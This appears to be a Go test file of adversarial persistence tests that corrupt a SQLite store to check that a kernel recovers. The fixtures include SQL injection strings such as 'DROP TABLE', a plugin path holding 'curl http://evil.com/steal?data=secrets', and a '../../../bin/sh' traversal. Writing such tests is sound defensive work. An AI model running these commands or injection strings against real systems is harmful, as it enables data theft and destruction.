package adversarial_test

import (
	"context"
	"database/sql"
	"encoding/json"
	"path/filepath"
	"testing"
	"time"

	"github.com/brainlet/brainkit"
	"github.com/brainlet/brainkit/sdk"
	"github.com/brainlet/brainkit/sdk/messages"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	_ "modernc.org/sqlite"
)

// ════════════════════════════════════════════════════════════════════════════
// PERSISTENCE ATTACKS
// Corrupt the SQLite store to break the kernel on restart.
// ════════════════════════════════════════════════════════════════════════════

// Attack: inject SQL via deployment source name
func TestPersistenceAttack_SQLInjectionInSource(t *testing.T) {
	tmpDir := t.TempDir()
	storePath := filepath.Join(tmpDir, "sqli.db")
	store, err := brainkit.NewSQLiteStore(storePath)
	require.NoError(t, err)

	k, err := brainkit.NewKernel(brainkit.KernelConfig{
		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
		Store: store,
	})
	require.NoError(t, err)

	ctx := context.Background()

	// Deploy with SQL injection in source name
	evilSources := []string{
		"'; DROP TABLE deployments; --",
		"test.ts' OR '1'='1",
		"test.ts\"; DELETE FROM schedules; --",
		"test.ts\x00evil",
	}

	for _, src := range evilSources {
		_, err := k.Deploy(ctx, src, `output("injected");`)
		// May succeed or fail — key is no SQL injection occurs
		if err == nil {
			k.Teardown(ctx, src)
		}
	}

	k.Close()

	// Reopen — tables should be intact
	store2, err := brainkit.NewSQLiteStore(storePath)
	require.NoError(t, err)

	k2, err := brainkit.NewKernel(brainkit.KernelConfig{
		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
		Store: store2,
	})
	require.NoError(t, err)
	defer k2.Close()

	assert.True(t, k2.Alive(ctx), "kernel should recover — SQL injection should not work")
}

// Attack: corrupt the deployments table directly
func TestPersistenceAttack_CorruptDeploymentTable(t *testing.T) {
	tmpDir := t.TempDir()
	storePath := filepath.Join(tmpDir, "corrupt.db")

	// Create valid store with a deployment
	store, _ := brainkit.NewSQLiteStore(storePath)
	k, err := brainkit.NewKernel(brainkit.KernelConfig{
		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
		Store: store,
	})
	require.NoError(t, err)
	k.Deploy(context.Background(), "valid.ts", `output("valid");`)
	k.Close()
	store.Close()

	// Open DB directly and corrupt data
	db, err := sql.Open("sqlite", storePath)
	require.NoError(t, err)

	// Inject deployment with code that throws during restore
	db.Exec(`INSERT OR REPLACE INTO deployments (source, code, deploy_order, deployed_at, package_name, role)
		VALUES ('evil.ts', 'throw new Error("corrupt restore");', 0, '2026-01-01T00:00:00Z', '', 'service')`)

	// Inject deployment with binary garbage as code
	db.Exec(`INSERT OR REPLACE INTO deployments (source, code, deploy_order, deployed_at, package_name, role)
		VALUES ('binary.ts', X'DEADBEEF', 1, '2026-01-01T00:00:00Z', '', 'service')`)

	// Inject deployment with enormous code
	bigCode := make([]byte, 1024*1024) // 1MB of garbage
	for i := range bigCode {
		bigCode[i] = byte('A' + (i % 26))
	}
	db.Exec(`INSERT OR REPLACE INTO deployments (source, code, deploy_order, deployed_at, package_name, role)
		VALUES ('huge.ts', ?, 2, '2026-01-01T00:00:00Z', '', 'service')`, string(bigCode))

	db.Close()

	// Reopen — kernel should handle corrupt deployments gracefully
	store2, _ := brainkit.NewSQLiteStore(storePath)
	var errors []error
	k2, err := brainkit.NewKernel(brainkit.KernelConfig{
		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
		Store: store2,
		ErrorHandler: func(err error, ctx brainkit.ErrorContext) {
			errors = append(errors, err)
		},
	})
	require.NoError(t, err)
	defer k2.Close()

	ctx := context.Background()
	assert.True(t, k2.Alive(ctx), "kernel should survive corrupt deployments")
	t.Logf("Errors during restore: %d", len(errors))

	// The valid deployment should still work
	deps := k2.ListDeployments()
	found := false
	for _, d := range deps {
		if d.Source == "valid.ts" {
			found = true
		}
	}
	assert.True(t, found, "valid deployment should survive corrupt siblings")
}

// Attack: corrupt schedule table with invalid expressions
func TestPersistenceAttack_CorruptScheduleTable(t *testing.T) {
	tmpDir := t.TempDir()
	storePath := filepath.Join(tmpDir, "sched-corrupt.db")

	store, _ := brainkit.NewSQLiteStore(storePath)
	store.SaveSchedule(brainkit.PersistedSchedule{
		ID: "valid-sched", Expression: "every 1h", Duration: time.Hour,
		Topic: "valid.topic", Payload: json.RawMessage(`{}`),
		Source: "test", CreatedAt: time.Now(), NextFire: time.Now().Add(time.Hour),
	})
	// Inject corrupt schedule
	store.SaveSchedule(brainkit.PersistedSchedule{
		ID: "corrupt-sched", Expression: "invalid-expression", Duration: 0,
		Topic: "", Payload: json.RawMessage(`not-json`),
		Source: "", CreatedAt: time.Time{}, NextFire: time.Time{},
	})
	// Inject schedule with negative duration
	store.SaveSchedule(brainkit.PersistedSchedule{
		ID: "neg-sched", Expression: "every -1h", Duration: -time.Hour,
		Topic: "neg.topic", Payload: json.RawMessage(`{}`),
		Source: "test", CreatedAt: time.Now(), NextFire: time.Now().Add(-time.Hour),
	})
	store.Close()

	store2, _ := brainkit.NewSQLiteStore(storePath)
	k, err := brainkit.NewKernel(brainkit.KernelConfig{
		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
		Store: store2,
	})
	require.NoError(t, err)
	defer k.Close()

	ctx := context.Background()
	assert.True(t, k.Alive(ctx), "kernel should survive corrupt schedules")
}

// Attack: WASM module table with corrupt binary data
func TestPersistenceAttack_CorruptWASMModule(t *testing.T) {
	tmpDir := t.TempDir()
	storePath := filepath.Join(tmpDir, "wasm-corrupt.db")

	store, _ := brainkit.NewSQLiteStore(storePath)

	// Save "module" with garbage binary
	store.SaveModule("garbage-mod", []byte("not-a-wasm-binary"), brainkit.WASMModuleInfo{
		Name: "garbage-mod", Size: 17, Exports: []string{"run"},
		CompiledAt: time.Now().Format(time.RFC3339), SourceHash: "abc123",
	})

	// Save shard referencing the garbage module
	store.SaveShard("garbage-shard", brainkit.ShardDescriptor{
		Module: "garbage-mod", Mode: "stateless",
		Handlers:   map[string]string{"test.topic": "run"},
		DeployedAt: time.Now(),
	})
	store.Close()

	store2, _ := brainkit.NewSQLiteStore(storePath)
	k, err := brainkit.NewKernel(brainkit.KernelConfig{
		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
		Store: store2,
	})
	require.NoError(t, err)
	defer k.Close()

	ctx := context.Background()
	assert.True(t, k.Alive(ctx), "kernel should survive corrupt WASM module in store")

	// Try to run the corrupt module — should error cleanly
	pr, _ := sdk.Publish(k, ctx, messages.WasmRunMsg{ModuleID: "garbage-mod"})
	ch := make(chan []byte, 1)
	unsub, _ := k.SubscribeRaw(ctx, pr.ReplyTo, func(m messages.Message) { ch <- m.Payload })
	defer unsub()

	select {
	case p := <-ch:
		assert.True(t, responseHasError(p), "running corrupt WASM should return error")
	case <-time.After(5 * time.Second):
		t.Fatal("timeout")
	}
}

// Attack: save deployment with code that mutates the store during restore
func TestPersistenceAttack_CodeMutatesStoreDuringRestore(t *testing.T) {
	tmpDir := t.TempDir()
	storePath := filepath.Join(tmpDir, "mutate.db")

	store, _ := brainkit.NewSQLiteStore(storePath)
	// This deployment, when re-deployed on restore, will try to delete other deployments
	store.SaveDeployment(brainkit.PersistedDeployment{
		Source: "mutator.ts",
		Code: `
			// Try to teardown another deployment during restore
			try {
				__go_brainkit_request("kit.teardown", JSON.stringify({source: "innocent.ts"}));
			} catch(e) {}
			output("mutated");
		`,
		Order: 1, DeployedAt: time.Now(),
	})
	store.SaveDeployment(brainkit.PersistedDeployment{
		Source: "innocent.ts", Code: `output("innocent");`,
		Order: 2, DeployedAt: time.Now(),
	})
	store.Close()

	store2, _ := brainkit.NewSQLiteStore(storePath)
	k, err := brainkit.NewKernel(brainkit.KernelConfig{
		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
		Store: store2,
	})
	require.NoError(t, err)
	defer k.Close()

	ctx := context.Background()
	// The mutator runs in a Compartment and __go_brainkit_request may not be available
	// But even if it is — the teardown during restore should be handled gracefully
	deps := k.ListDeployments()
	t.Logf("Deployments after restore with mutator: %d", len(deps))
	assert.True(t, k.Alive(ctx))
}

// Attack: running plugins table with evil binary paths
func TestPersistenceAttack_EvilPluginPaths(t *testing.T) {
	tmpDir := t.TempDir()
	storePath := filepath.Join(tmpDir, "plugin-evil.db")

	store, _ := brainkit.NewSQLiteStore(storePath)
	store.SaveRunningPlugin(brainkit.RunningPluginRecord{
		Name:       "evil-plugin",
		BinaryPath: "/usr/bin/curl http://evil.com/steal?data=secrets",
		StartOrder: 1,
		StartedAt:  time.Now(),
	})
	store.SaveRunningPlugin(brainkit.RunningPluginRecord{
		Name:       "path-traversal",
		BinaryPath: "../../../bin/sh",
		StartOrder: 2,
		StartedAt:  time.Now(),
	})
	store.Close()

	// These plugins won't actually start (binary not found, wrong transport)
	// But the kernel should handle them gracefully
	store2, _ := brainkit.NewSQLiteStore(storePath)
	k, err := brainkit.NewKernel(brainkit.KernelConfig{
		Namespace: "test", CallerID: "test", FSRoot: tmpDir,
		Store: store2,
	})
	require.NoError(t, err)
	defer k.Close()

	assert.True(t, k.Alive(context.Background()), "kernel should survive evil plugin paths in store")
}

// Attack: concurrent writes to the same store from multiple kernels
func TestPersistenceAttack_ConcurrentStoreWrites(t *testing.T) {
	tmpDir := t.TempDir()
	storePath := filepath.Join(tmpDir, "concurrent.db")

	store1, _ := brainkit.NewSQLiteStore(storePath)
	store2, _ := brainkit.NewSQLiteStore(storePath)

	k1, err := brainkit.NewKernel(brainkit.KernelConfig{
		Namespace: "k1", CallerID: "k1", FSRoot: tmpDir, Store: store1,
	})
	require.NoError(t, err)
	defer k1.Close()

	k2, err := brainkit.NewKernel(brainkit.KernelConfig{
		Namespace: "k2", CallerID: "k2", FSRoot: tmpDir, Store: store2,
	})
	require.NoError(t, err)
	defer k2.Close()

	ctx := context.Background()

	// Both kernels deploy simultaneously
	done := make(chan bool, 2)
	go func() {
		for i := 0; i < 10; i++ {
			k1.Deploy(ctx, "k1-concurrent.ts", `output("k1");`)
			k1.Teardown(ctx, "k1-concurrent.ts")
		}
		done <- true
	}()
	go func() {
		for i := 0; i < 10; i++ {
			k2.Deploy(ctx, "k2-concurrent.ts", `output("k2");`)
			k2.Teardown(ctx, "k2-concurrent.ts")
		}
		done <- true
	}()

	<-done
	<-done

	assert.True(t, k1.Alive(ctx))
	assert.True(t, k2.Alive(ctx))
}
